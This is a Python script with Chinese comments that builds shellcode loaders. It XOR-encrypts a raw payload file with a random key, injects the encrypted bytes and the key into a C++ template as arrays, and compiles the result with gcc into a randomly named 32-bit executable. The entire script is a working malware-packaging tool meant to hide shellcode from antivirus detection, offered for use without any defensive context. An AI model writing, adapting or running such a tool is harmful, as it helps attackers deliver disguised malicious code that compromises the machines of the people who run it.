import codecs
import sys
import os
import random
import string


KEY = ""
def generate_random_string(length):
    # 从所有字母中选择
    characters = string.ascii_letters
    # 随机生成字符串的长度
    random_string = ''.join(random.choices(characters, k=length))
    return random_string
#生成KEY

KEY+=generate_random_string(16)
print("您的KEY值为："+KEY)
#加密函数
def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i:i + 1]
        current_key = key[i % len(key):i % len(key) + 1]
        output_str += chr(ord(current) ^ ord(current_key))

    return output_str



def printCiphertext(ciphertext):
    print('{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')

def convert_to_c_array(ciphertext):
    c_array = '{ '
    c_array += ', '.join(['0x' + hex(ord(x))[2:] for x in ciphertext])
    c_array += ' }'
    return c_array


try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = xor(plaintext, KEY)
xor_shellcode=convert_to_c_array(ciphertext)

# 原始文件路径和目标文件路径
original_file = "template.cpp"
target_file = "xor_shellcode.cpp"

# 第x行要更改的内容
shellcode_new_content = "    unsigned char xpp[] = "+xor_shellcode+";"
KEY_new_content="    unsigned char key[] = \""+KEY+"\";"

# 以UTF-8编码方式打开原始文件和目标文件
with codecs.open(original_file, 'r', encoding='utf-8') as src, codecs.open(target_file, 'w', encoding='utf-8') as dst:
    # 逐行读取原始文件内容
    for i, line in enumerate(src):
        # 判断是否是第几行
        if i == 20:
            # 写入更改后的内容
            dst.write(shellcode_new_content + '\n')
        elif i==22:
            dst.write(KEY_new_content+'\n')
        else:
            # 将当前行直接写入目标文件
            dst.write(line)

# 关闭原始文件和目标文件
src.close()
dst.close()

# 源文件名和可执行文件名
source_file = "xor_shellcode.cpp"
exe_file = ""
#随机输出名

exe_file+=generate_random_string(8)
print("您的可执行文件名为："+exe_file)
# 调用gcc编译器进行编译
command = "gcc -m32 -o {} {}".format(exe_file, source_file)
os.system(command)
